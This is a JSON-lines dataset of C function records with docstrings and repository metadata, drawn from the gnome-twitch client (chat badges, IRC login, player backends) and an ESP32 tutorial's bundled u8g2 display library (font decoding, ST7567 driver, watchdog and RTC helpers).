{"docstring": "// NOTE: This will automatically download any badge sets if they\n// aren't already\n", "func_signal": "GtChatBadge*\ngt_twitch_fetch_chat_badge(GtTwitch* self,\n    const gchar* chan_id, const gchar* badge_name,\n    const gchar* version, GError** error)", "code": "{\n    g_assert(GT_IS_TWITCH(self));\n    g_assert_false(utils_str_empty(badge_name));\n    g_assert_false(utils_str_empty(version));\n\n    GtTwitchPrivate* priv = gt_twitch_get_instance_private(self);\n    g_autofree gchar* global_key = NULL;\n    g_autofree gchar* chan_key = NULL;\n    GtChatBadge* ret = NULL;\n    GError* err = NULL;\n\n    gt_twitch_load_chat_badge_sets_for_channel(self, chan_id, &err);\n\n    CHECK_AND_PROPAGATE_ERROR(\"Unable to fetch chat badge for channel '%s with badge name '%s' and version '%s'\",\n        chan_id, badge_name, version);\n\n    global_key = g_strdup_printf(\"global-%s-%s\", badge_name, version);\n    chan_key = g_strdup_printf(\"%s-%s-%s\", chan_id, badge_name, version);\n\n    if (g_hash_table_contains(priv->badge_table, chan_key))\n        ret = g_hash_table_lookup(priv->badge_table, chan_key);\n    else if (g_hash_table_contains(priv->badge_table, global_key))\n        ret = g_hash_table_lookup(priv->badge_table, global_key);\n    else\n        g_assert_not_reached(); //NOTE: We might as well crash here as the badge being null would lead to many problems\n\nerror:\n    return ret;\n}", "path": "src\\gt-twitch.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "//TODO: Use \"unique\" hash\n", "func_signal": "static const gchar*\nget_default_chat_colour(const gchar* name)", "code": "{\n    gint total = 0;\n\n    for (const char* c = name; c[0] != '\\0'; c++)\n        total += c[0];\n\n    return default_chat_colours[total % 13];\n}", "path": "src\\gt-chat.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "//TODO: Although clunky this would be cleaner if it's split up into\n//two functions one for sending and one for receiving\n", "func_signal": "static gboolean\nhandle_message(GtIrc* self, GOutputStream* ostream, GtIrcMessage* msg)", "code": "{\n    GtIrcPrivate* priv = gt_irc_get_instance_private(self);\n\n    if (ostream == priv->ostream_recv)\n    {\n        if (!priv->recv_logged_in)\n        {\n            if (msg->cmd_type == GT_IRC_COMMAND_REPLY && msg->cmd.reply->type == GT_CHAT_REPLY_WELCOME)\n            {\n                priv->recv_logged_in = TRUE;\n\n                g_mutex_lock(&priv->mutex);\n\n                if (priv->state == GT_IRC_STATE_CONNECTED &&\n                    priv->send_logged_in)\n                {\n                    priv->state = GT_IRC_STATE_LOGGED_IN;\n                    g_object_notify_by_pspec(G_OBJECT(self), props[PROP_STATE]);\n                }\n\n                g_mutex_unlock(&priv->mutex);\n            }\n            else\n            {\n                GError* err;\n\n                err = g_error_new(GT_IRC_ERROR, ERROR_LOG_IN_FAILED,\n                                  \"Unable to log in on receive socket, server replied '%s'\", msg->cmd.notice->msg);\n\n                g_signal_emit(self, sigs[SIG_ERROR_ENCOUNTERED], 0, err);\n\n                g_error_free(err);\n\n                WARNINGF(\"Unable to log in on receive socket, server replied with message='%s'\",\n                          msg->cmd.notice->msg);\n\n                return FALSE;\n            }\n        }\n\n        if (msg->cmd_type == GT_IRC_COMMAND_PING)\n        {\n            send_cmd(ostream, CHAT_CMD_STR_PONG, msg->cmd.ping->server);\n        }\n        else\n        {\n            if (priv->chan) g_async_queue_push(self->source->queue, msg);\n        }\n    }\n    else if (ostream == priv->ostream_send)\n    {\n        if (!priv->send_logged_in)\n        {\n            if (msg->cmd_type == GT_IRC_COMMAND_REPLY && msg->cmd.reply->type == GT_CHAT_REPLY_WELCOME)\n            {\n                priv->send_logged_in = TRUE;\n\n                g_mutex_lock(&priv->mutex);\n\n                if (priv->state == GT_IRC_STATE_CONNECTED &&\n                    priv->recv_logged_in)\n                {\n                    priv->state = GT_IRC_STATE_LOGGED_IN;\n                    g_object_notify_by_pspec(G_OBJECT(self), props[PROP_STATE]);\n                }\n\n                g_mutex_unlock(&priv->mutex);\n            }\n            else\n            {\n                GError* err;\n\n                err = g_error_new(GT_IRC_ERROR, ERROR_LOG_IN_FAILED,\n                                  \"Unable to log in on send socket, server replied '%s'\", msg->cmd.notice->msg);\n\n                g_signal_emit(self, sigs[SIG_ERROR_ENCOUNTERED], 0, err);\n\n                g_error_free(err);\n\n                WARNINGF(\"Unable to log in on send socket, server replied with message='%s'\",\n                          msg->cmd.notice->msg);\n\n                return FALSE;\n            }\n        }\n\n        if (msg->cmd_type == GT_IRC_COMMAND_PING)\n            send_cmd(ostream, CHAT_CMD_STR_PONG, msg->cmd.ping->server);\n\n        gt_irc_message_free(msg);\n    }\n\n    return TRUE;\n}", "path": "src\\gt-irc.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/* NOTE: This is so that we notify properies on the GLib main thread,\n  * otherwise bad things can happen */\n", "func_signal": "static gboolean\nnotify_prop_cb(gpointer udata)", "code": "{\n    RETURN_VAL_IF_FAIL(G_IS_PARAM_SPEC(udata), G_SOURCE_REMOVE);\n\n    GParamSpec* pspec = udata; /* NOTE: Will be destroyed automatically by idle_add_full */\n    g_autoptr(GWeakRef) ref = g_param_spec_steal_qdata(pspec, g_quark_from_string(\"_gt_self\"));\n    g_autoptr(GtPlayerBackendMpvOpenGL) self = g_weak_ref_get(ref);\n\n    if (!self) {TRACE(\"Unreffed while wating\"); return G_SOURCE_REMOVE;}\n\n    g_object_notify_by_pspec(G_OBJECT(self), pspec);\n\n    return G_SOURCE_REMOVE;\n}", "path": "player-backends\\player-backend-mpv-opengl\\gt-player-backend-mpv-opengl.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/* NOTE: We need the underscore because pause is already defined in unistd.h */\n", "func_signal": "static void\n_pause(GtPlayerBackend* backend)", "code": "{\n    RETURN_IF_FAIL(GT_IS_PLAYER_BACKEND_GSTREAMER_CAIRO(backend));\n\n    GtPlayerBackendGstreamerCairo* self = GT_PLAYER_BACKEND_GSTREAMER_CAIRO(backend);\n    GtPlayerBackendGstreamerCairoPrivate* priv = gt_player_backend_gstreamer_cairo_get_instance_private(self);\n\n    gst_element_set_state(priv->playbin, GST_STATE_PAUSED);\n}", "path": "player-backends\\player-backend-gstreamer-cairo\\gt-player-backend-gstreamer-cairo.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "//NOTE: Not cancellable; hard to guarantee that channel is not unfollowed\n", "func_signal": "void\ngt_twitch_unfollow_channel_async(GtTwitch* self, const gchar* chan_name,\n    GAsyncReadyCallback cb, gpointer udata)", "code": "{\n    g_assert(GT_IS_TWITCH(self));\n    g_assert_false(utils_str_empty(chan_name));\n\n    GTask* task = NULL;\n    GenericTaskData* data = NULL;\n\n    task = g_task_new(self, NULL, cb, udata);\n\n    data = generic_task_data_new();\n    data->str_1 = g_strdup(chan_name);\n\n    g_task_set_task_data(task, data, (GDestroyNotify) generic_task_data_free);\n\n    g_task_run_in_thread(task, unfollow_channel_async_cb);\n\n    g_object_unref(task);\n}", "path": "src\\gt-twitch.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "//Target -> source\n", "func_signal": "static gboolean\nhandle_position_from(GBinding* binding,\n                     const GValue* from,\n                     GValue* to,\n                     gpointer udata)", "code": "{\n    GtPlayer* self = GT_PLAYER(udata);\n    GtPlayerPrivate* priv = gt_player_get_instance_private(self);\n    gint width = gtk_widget_get_allocated_width(priv->docking_pane);\n    gint pos = g_value_get_int(from);\n\n    g_value_set_double(to, (gdouble) pos / (gdouble) width);\n\n    return TRUE;\n}", "path": "src\\gt-player.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/*=======================================================================*/\n/*\n  setup the hardware and start interrupts.\n  called by \"Reset_Handler\"\n*/\n", "func_signal": "int __attribute__ ((noinline)) main(void)", "code": "{\n\n  /* call to the lpc lib setup procedure. This will set the IRC as clk src and main clk to 24 MHz */\n  Chip_SystemInit(); \n\n  /* if the clock or PLL has been changed, also update the global variable SystemCoreClock */\n  SystemCoreClockUpdate();\n\n  /* set systick and start systick interrupt */\n  SysTick_Config(SystemCoreClock/1000UL*(unsigned long)SYS_TICK_PERIOD_IN_MS);\n  \n  /* enable clock for several subsystems */\n  Chip_Clock_EnablePeriphClock(SYSCTL_CLOCK_IOCON | SYSCTL_CLOCK_GPIO | SYSCTL_CLOCK_SWM);\n\n  /* turn on GPIO */\n  Chip_GPIO_Init(LPC_GPIO_PORT);\t/* Chip_Clock_EnablePeriphClock(SYSCTL_CLOCK_GPIO); */\n  \n\n  //Chip_IOCON_PinMuxSet(LPC_IOCON, 0, 15, IOCON_FUNC1);\t/* RxD */  \n  Chip_GPIO_SetPinDIROutput(LPC_GPIO_PORT, 0, 15);\t\n\n  /* setup display */\n  u8g2_Setup_ssd1306_i2c_128x64_noname_2(&u8g2, U8G2_R0, u8x8_byte_sw_i2c, u8x8_gpio_and_delay_lpc824);\n  u8g2_InitDisplay(&u8g2);\n  u8g2_SetPowerSave(&u8g2, 0);\n\n  \n  for(;;)\n  {\n    Chip_GPIO_SetPinOutHigh(LPC_GPIO_PORT, 0, 15);\n    delay_micro_seconds(1000000);\n\n    u8g2_FirstPage(&u8g2);\n    do\n    {\n      draw(&u8g2);\n    } while( u8g2_NextPage(&u8g2) );\n    \n    Chip_GPIO_SetPinOutLow(LPC_GPIO_PORT, 0, 15);\n    delay_micro_seconds(1000000);\n  }\n}", "path": "18_u8g2\\components\\u8g2\\sys\\arm\\lpc824\\hello_world\\main.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* Clear WWDT interrupt status flags */\n", "func_signal": "void Chip_WWDT_ClearStatusFlag(LPC_WWDT_T *pWWDT, uint32_t status)", "code": "{\n\tif (status & WWDT_WDMOD_WDTOF) {\n\t\tpWWDT->MOD &= (~WWDT_WDMOD_WDTOF) & WWDT_WDMOD_BITMASK;\n\t}\n\n\tif (status & WWDT_WDMOD_WDINT) {\n\t\tpWWDT->MOD = WWDT_WDMOD_WDINT | (pWWDT->MOD & ~WWDT_MOD_RESERVED);\n\t}\n}", "path": "18_u8g2\\components\\u8g2\\sys\\arm\\lpc824\\lpc_chip_82x\\src\\wwdt_8xx.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* Initialize the Watchdog timer */\n", "func_signal": "void Chip_WWDT_Init(LPC_WWDT_T *pWWDT)", "code": "{\n\tChip_Clock_EnablePeriphClock(SYSCTL_CLOCK_WWDT);\n\n\t/* Disable watchdog */\n\tpWWDT->MOD       = 0;\n\tpWWDT->TC        = 0xFF;\n\tpWWDT->WARNINT   = 0xFFFF;\n\tpWWDT->WINDOW    = 0xFFFFFF;\n}", "path": "18_u8g2\\components\\u8g2\\sys\\arm\\lpc824\\lpc_chip_82x\\src\\wwdt_8xx.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/*===============================================*/\n", "func_signal": "void u8g2_SetFont(u8g2_t *u8g2, const uint8_t  *font)", "code": "{\n  if ( u8g2->font != font )\n  {\n#ifdef  __unix__\n\tu8g2->last_font_data = NULL;\n\tu8g2->last_unicode = 0x0ffff;\n#endif \n    u8g2->font = font;\n    u8g2_read_font_info(&(u8g2->font_info), font);\n    u8g2_UpdateRefHeight(u8g2);\n    /* u8g2_SetFontPosBaseline(u8g2); */ /* removed with issue 195 */\n  }\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/*\n  Description:\n    Decode and draw a glyph.\n  Args:\n    glyph_data: \t\t\t\t\tPointer to the compressed glyph data of the font\n    u8g2->font_decode.target_x\t\tX position\n    u8g2->font_decode.target_y\t\tY position\n    u8g2->font_decode.is_transparent\tTransparent mode\n  Return:\n    Width (delta x advance) of the glyph.\n  Calls:\n    u8g2_font_decode_len()\n*/\n/* optimized */\n", "func_signal": "int8_t u8g2_font_decode_glyph(u8g2_t *u8g2, const uint8_t *glyph_data)", "code": "{\n  uint8_t a, b;\n  int8_t x, y;\n  int8_t d;\n  int8_t h;\n  u8g2_font_decode_t *decode = &(u8g2->font_decode);\n    \n  u8g2_font_setup_decode(u8g2, glyph_data);\n  h = u8g2->font_decode.glyph_height;\n  \n  x = u8g2_font_decode_get_signed_bits(decode, u8g2->font_info.bits_per_char_x);\n  y = u8g2_font_decode_get_signed_bits(decode, u8g2->font_info.bits_per_char_y);\n  d = u8g2_font_decode_get_signed_bits(decode, u8g2->font_info.bits_per_delta_x);\n  \n  if ( decode->glyph_width > 0 )\n  {\n#ifdef U8G2_WITH_FONT_ROTATION\n    decode->target_x = u8g2_add_vector_x(decode->target_x, x, -(h+y), decode->dir);\n    decode->target_y = u8g2_add_vector_y(decode->target_y, x, -(h+y), decode->dir);\n#else\n    decode->target_x += x;\n    decode->target_y -= h+y;\n#endif\n    //u8g2_add_vector(&(decode->target_x), &(decode->target_y), x, -(h+y), decode->dir);\n\n#ifdef U8G2_WITH_INTERSECTION\n    {\n      u8g2_uint_t x0, x1, y0, y1;\n      x0 = decode->target_x;\n      y0 = decode->target_y;\n      x1 = x0;\n      y1 = y0;\n      \n#ifdef U8G2_WITH_FONT_ROTATION\n      switch(decode->dir)\n      {\n\tcase 0:\n\t    x1 += decode->glyph_width;\n\t    y1 += h;\n\t    break;\n\tcase 1:\n\t    x0 -= h;\n\t    x0++;\t/* shift down, because of assymetric boundaries for the interseciton test */\n\t    x1++;\n\t    y1 += decode->glyph_width;\n\t    break;\n\tcase 2:\n\t    x0 -= decode->glyph_width;\n\t    x0++;\t/* shift down, because of assymetric boundaries for the interseciton test */\n\t    x1++;\n\t    y0 -= h;\n\t    y0++;\t/* shift down, because of assymetric boundaries for the interseciton test */\n\t    y1++;\n\t    break;\t  \n\tcase 3:\n\t    x1 += h;\n\t    y0 -= decode->glyph_width;\n\t    y0++;\t/* shift down, because of assymetric boundaries for the interseciton test */\n\t    y1++;\n\t    break;\t  \n      }\n#else /* U8G2_WITH_FONT_ROTATION */\n      x1 += decode->glyph_width;\n      y1 += h;      \n#endif\n      \n      if ( u8g2_IsIntersection(u8g2, x0, y0, x1, y1) == 0 ) \n\treturn d;\n    }\n#endif /* U8G2_WITH_INTERSECTION */\n   \n    /* reset local x/y position */\n    decode->x = 0;\n    decode->y = 0;\n    \n    /* decode glyph */\n    for(;;)\n    {\n      a = u8g2_font_decode_get_unsigned_bits(decode, u8g2->font_info.bits_per_0);\n      b = u8g2_font_decode_get_unsigned_bits(decode, u8g2->font_info.bits_per_1);\n      do\n      {\n\tu8g2_font_decode_len(u8g2, a, 0);\n\tu8g2_font_decode_len(u8g2, b, 1);\n      } while( u8g2_font_decode_get_unsigned_bits(decode, 1) != 0 );\n\n      if ( decode->y >= h )\n\tbreak;\n    }\n    \n    /* restore the u8g2 draw color, because this is modified by the decode algo */\n    u8g2->draw_color = decode->fg_color;\n  }\n  return d;\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* convert the content of the bcd array to the ymd&hms vars */\n", "func_signal": "void rtc_bcd_to_ymd_hms(rtc_t *rtc)", "code": "{\n  rtc->sec = rtc_bcd_to_uint8(rtc, 0);\n  rtc->min = rtc_bcd_to_uint8(rtc, 2);\n  rtc->hour = rtc_bcd_to_uint8(rtc, 4);\n  rtc->day = rtc_bcd_to_uint8(rtc, 6);\n  rtc->month = rtc_bcd_to_uint8(rtc, 8);\n  rtc->year = rtc_bcd_to_uint8(rtc, 10);\n}", "path": "22_deep_sleep\\components\\u8g2\\sys\\arm\\stm32l031x6\\clock\\rtc.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* read RTC register into bcd array */\n", "func_signal": "void rtc_register_to_bcd(rtc_t *rtc)", "code": "{\n  uint32_t r;\n  int i;\n  \n  r = RTC->TR;\n  i = 0;\n  do\n  {\n    rtc->bcd[i] = r & 15;\n    r >>= 4;\n    i++;\n  } while( i < 6 );\n  \n  rtc->bcd[1] &= 7;\t/* seconds */\n  rtc->bcd[3] &= 7;\t/* minutes */\n  rtc->bcd[5] &= 3; /* hours */\n  \n  r = RTC->DR;\n  i = 6;\n  do\n  {\n    rtc->bcd[i] = r & 15;\n    r >>= 4;\n    i++;\n  } while( i < 12 );\n\n  rtc->bcd[7] &= 3;\t/* days */\n  rtc->bcd[9] &= 1;\t/* months */  \n}", "path": "22_deep_sleep\\components\\u8g2\\sys\\arm\\stm32l031x6\\clock\\rtc.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* optimized */\n", "func_signal": "uint8_t u8g2_font_decode_get_unsigned_bits(u8g2_font_decode_t *f, uint8_t cnt)", "code": "{\n  uint8_t val;\n  uint8_t bit_pos = f->decode_bit_pos;\n  uint8_t bit_pos_plus_cnt;\n  \n  //val = *(f->decode_ptr);\n  val = u8x8_pgm_read( f->decode_ptr );  \n  \n  val >>= bit_pos;\n  bit_pos_plus_cnt = bit_pos;\n  bit_pos_plus_cnt += cnt;\n  if ( bit_pos_plus_cnt >= 8 )\n  {\n    uint8_t s = 8;\n    s -= bit_pos;\n    f->decode_ptr++;\n    //val |= *(f->decode_ptr) << (8-bit_pos);\n    val |= u8x8_pgm_read( f->decode_ptr ) << (s);\n    //bit_pos -= 8;\n    bit_pos_plus_cnt -= 8;\n  }\n  val &= (1U<<cnt)-1;\n  //bit_pos += cnt;\n  \n  f->decode_bit_pos = bit_pos_plus_cnt;\n  return val;\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* JLX12864 display */\n", "func_signal": "uint8_t u8x8_d_st7567_jlx12864(u8x8_t *u8x8, uint8_t msg, uint8_t arg_int, void *arg_ptr)", "code": "{\n  uint8_t x, c;\n  uint8_t *ptr;\n  switch(msg)\n  {\n    case U8X8_MSG_DISPLAY_SETUP_MEMORY:\n      u8x8_d_helper_display_setup_memory(u8x8, &u8x8_st7567_jlx12864_display_info);\n      break;\n    case U8X8_MSG_DISPLAY_INIT:\n      u8x8_d_helper_display_init(u8x8);\n      u8x8_cad_SendSequence(u8x8, u8x8_st7567_jlx12864_init_seq);\n      break;\n    case U8X8_MSG_DISPLAY_SET_POWER_SAVE:\n      if ( arg_int == 0 )\n\tu8x8_cad_SendSequence(u8x8, u8x8_d_st7567_132x64_powersave0_seq);\n      else\n\tu8x8_cad_SendSequence(u8x8, u8x8_d_st7567_132x64_powersave1_seq);\n      break;\n    case U8X8_MSG_DISPLAY_SET_FLIP_MODE:\n      if ( arg_int == 0 )\n      {\n\tu8x8_cad_SendSequence(u8x8, u8x8_d_st7567_132x64_flip0_seq);\n\tu8x8->x_offset = u8x8->display_info->default_x_offset;\n      }\n      else\n      {\n\tu8x8_cad_SendSequence(u8x8, u8x8_d_st7567_132x64_flip1_seq);\n\tu8x8->x_offset = u8x8->display_info->flipmode_x_offset;\n      }\t\n      break;\n#ifdef U8X8_WITH_SET_CONTRAST\n    case U8X8_MSG_DISPLAY_SET_CONTRAST:\n      u8x8_cad_StartTransfer(u8x8);\n      u8x8_cad_SendCmd(u8x8, 0x081 );\n      u8x8_cad_SendArg(u8x8, arg_int >> 2 );\t/* st7567 has range from 0 to 63 */\n      u8x8_cad_EndTransfer(u8x8);\n      break;\n#endif\n    case U8X8_MSG_DISPLAY_DRAW_TILE:\n      u8x8_cad_StartTransfer(u8x8);\n    \n      x = ((u8x8_tile_t *)arg_ptr)->x_pos;\n      x *= 8;\n      x += u8x8->x_offset;\n      u8x8_cad_SendCmd(u8x8, 0x010 | (x>>4) );\n      u8x8_cad_SendCmd(u8x8, 0x000 | ((x&15)));\n      u8x8_cad_SendCmd(u8x8, 0x0b0 | (((u8x8_tile_t *)arg_ptr)->y_pos));\n    \n      c = ((u8x8_tile_t *)arg_ptr)->cnt;\n      c *= 8;\n      ptr = ((u8x8_tile_t *)arg_ptr)->tile_ptr;\n      /* \n\tThe following if condition checks the hardware limits of the st7567 \n\tcontroller: It is not allowed to write beyond the display limits.\n\tThis is in fact an issue within flip mode.\n      */\n      if ( c + x > 132u )\n      {\n\tc = 132u;\n\tc -= x;\n      }\n      do\n      {\n\tu8x8_cad_SendData(u8x8, c, ptr);\t/* note: SendData can not handle more than 255 bytes */\n\targ_int--;\n      } while( arg_int > 0 );\n      \n      u8x8_cad_EndTransfer(u8x8);\n      break;\n    default:\n      return 0;\n  }\n  return 1;\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8x8_d_st7567.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* side effect: updates u8g2->font_decode and u8g2->glyph_x_offset */\n", "func_signal": "int8_t u8g2_GetGlyphWidth(u8g2_t *u8g2, uint16_t requested_encoding)", "code": "{\n  const uint8_t *glyph_data = u8g2_font_get_glyph_data(u8g2, requested_encoding);\n  if ( glyph_data == NULL )\n    return 0; \n  \n  u8g2_font_setup_decode(u8g2, glyph_data);\n  u8g2->glyph_x_offset = u8g2_font_decode_get_signed_bits(&(u8g2->font_decode), u8g2->font_info.bits_per_char_x);\n  u8g2_font_decode_get_signed_bits(&(u8g2->font_decode), u8g2->font_info.bits_per_char_y);\n  \n  /* glyph width is here: u8g2->font_decode.glyph_width */\n\n  return u8g2_font_decode_get_signed_bits(&(u8g2->font_decode), u8g2->font_info.bits_per_delta_x);\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* pax instruments 132x64 display */\n", "func_signal": "uint8_t u8x8_d_st7567_pi_132x64(u8x8_t *u8x8, uint8_t msg, uint8_t arg_int, void *arg_ptr)", "code": "{\n  uint8_t x, c;\n  uint8_t *ptr;\n  switch(msg)\n  {\n    case U8X8_MSG_DISPLAY_SETUP_MEMORY:\n      u8x8_d_helper_display_setup_memory(u8x8, &u8x8_st7567_132x64_display_info);\n      break;\n    case U8X8_MSG_DISPLAY_INIT:\n      u8x8_d_helper_display_init(u8x8);\n      u8x8_cad_SendSequence(u8x8, u8x8_d_st7567_132x64_init_seq);\n      break;\n    case U8X8_MSG_DISPLAY_SET_POWER_SAVE:\n      if ( arg_int == 0 )\n\tu8x8_cad_SendSequence(u8x8, u8x8_d_st7567_132x64_powersave0_seq);\n      else\n\tu8x8_cad_SendSequence(u8x8, u8x8_d_st7567_132x64_powersave1_seq);\n      break;\n    case U8X8_MSG_DISPLAY_SET_FLIP_MODE:\n      if ( arg_int == 0 )\n      {\n\tu8x8_cad_SendSequence(u8x8, u8x8_d_st7567_132x64_flip0_seq);\n\tu8x8->x_offset = u8x8->display_info->default_x_offset;\n      }\n      else\n      {\n\tu8x8_cad_SendSequence(u8x8, u8x8_d_st7567_132x64_flip1_seq);\n\tu8x8->x_offset = u8x8->display_info->flipmode_x_offset;\n      }\t\n      break;\n#ifdef U8X8_WITH_SET_CONTRAST\n    case U8X8_MSG_DISPLAY_SET_CONTRAST:\n      u8x8_cad_StartTransfer(u8x8);\n      u8x8_cad_SendCmd(u8x8, 0x081 );\n      u8x8_cad_SendArg(u8x8, arg_int >> 2 );\t/* st7567 has range from 0 to 63 */\n      u8x8_cad_EndTransfer(u8x8);\n      break;\n#endif\n    case U8X8_MSG_DISPLAY_DRAW_TILE:\n      u8x8_cad_StartTransfer(u8x8);\n    \n      x = ((u8x8_tile_t *)arg_ptr)->x_pos;\n      x *= 8;\n      x += u8x8->x_offset;\n      u8x8_cad_SendCmd(u8x8, 0x010 | (x>>4) );\n      u8x8_cad_SendCmd(u8x8, 0x000 | ((x&15)));\n      u8x8_cad_SendCmd(u8x8, 0x0b0 | (((u8x8_tile_t *)arg_ptr)->y_pos));\n    \n      c = ((u8x8_tile_t *)arg_ptr)->cnt;\n      c *= 8;\n      ptr = ((u8x8_tile_t *)arg_ptr)->tile_ptr;\n      /* \n\tThe following if condition checks the hardware limits of the st7567 \n\tcontroller: It is not allowed to write beyond the display limits.\n\tThis is in fact an issue within flip mode.\n      */\n      if ( c + x > 132u )\n      {\n\tc = 132u;\n\tc -= x;\n      }\n      do\n      {\n\tu8x8_cad_SendData(u8x8, c, ptr);\t/* note: SendData can not handle more than 255 bytes */\n\targ_int--;\n      } while( arg_int > 0 );\n      \n      u8x8_cad_EndTransfer(u8x8);\n      break;\n    default:\n      return 0;\n  }\n  return 1;\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8x8_d_st7567.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* u8g compatible GetStrX function */\n", "func_signal": "int8_t u8g2_GetStrX(u8g2_t *u8g2, const char *s)", "code": "{\n  uint8_t w;\n  int8_t ox, dx;\n  u8g2_GetGlyphHorizontalProperties(u8g2, *s, &w, &ox, &dx);\n  return ox;\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/*========================================================================*/\n/* new font format */\n", "func_signal": "void u8g2_read_font_info(u8g2_font_info_t *font_info, const uint8_t *font)", "code": "{\n  /* offset 0 */\n  font_info->glyph_cnt = u8g2_font_get_byte(font, 0);\n  font_info->bbx_mode = u8g2_font_get_byte(font, 1);\n  font_info->bits_per_0 = u8g2_font_get_byte(font, 2);\n  font_info->bits_per_1 = u8g2_font_get_byte(font, 3);\n  \n  /* offset 4 */\n  font_info->bits_per_char_width = u8g2_font_get_byte(font, 4);\n  font_info->bits_per_char_height = u8g2_font_get_byte(font, 5);\n  font_info->bits_per_char_x = u8g2_font_get_byte(font, 6);\n  font_info->bits_per_char_y = u8g2_font_get_byte(font, 7);\n  font_info->bits_per_delta_x = u8g2_font_get_byte(font, 8);\n  \n  /* offset 9 */\n  font_info->max_char_width = u8g2_font_get_byte(font, 9);\n  font_info->max_char_height = u8g2_font_get_byte(font, 10);\n  font_info->x_offset = u8g2_font_get_byte(font, 11);\n  font_info->y_offset = u8g2_font_get_byte(font, 12);\n  \n  /* offset 13 */\n  font_info->ascent_A = u8g2_font_get_byte(font, 13);\n  font_info->descent_g = u8g2_font_get_byte(font, 14);\n  font_info->ascent_para = u8g2_font_get_byte(font, 15);\n  font_info->descent_para = u8g2_font_get_byte(font, 16);\n  \n  /* offset 17 */\n  font_info->start_pos_upper_A = u8g2_font_get_word(font, 17);\n  font_info->start_pos_lower_a = u8g2_font_get_word(font, 19); \n  \n  /* offset 21 */\n#ifdef U8G2_WITH_UNICODE\n  font_info->start_pos_unicode = u8g2_font_get_word(font, 21); \n#endif\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* calculate the overall length of the font, only used to create the picture for the google wiki */\n", "func_signal": "size_t u8g2_GetFontSize(const uint8_t *font_arg)", "code": "{\n  uint16_t e;\n  const uint8_t *font = font_arg;\n  font += U8G2_FONT_DATA_STRUCT_SIZE;\n  \n  for(;;)\n  {\n    if ( u8x8_pgm_read( font + 1 ) == 0 )\n      break;\n    font += u8x8_pgm_read( font + 1 );\n  }\n  \n  /* continue with unicode section */\n  font += 2;\n  \n  for(;;)\n  {\n    e = u8x8_pgm_read( font );\n    e <<= 8;\n    e |= u8x8_pgm_read( font + 1 );\n    if ( e == 0 )\n      break;\n    font += u8x8_pgm_read( font + 2 );    \n  }\n  \n  return (font - font_arg) + 2;\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/* removed NOINLINE, because it leads to smaller code, might also be faster */\n//static uint8_t u8g2_font_get_byte(const uint8_t *font, uint8_t offset) U8G2_NOINLINE;\n", "func_signal": "static uint8_t u8g2_font_get_byte(const uint8_t *font, uint8_t offset)", "code": "{\n  font += offset;\n  return u8x8_pgm_read( font );  \n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
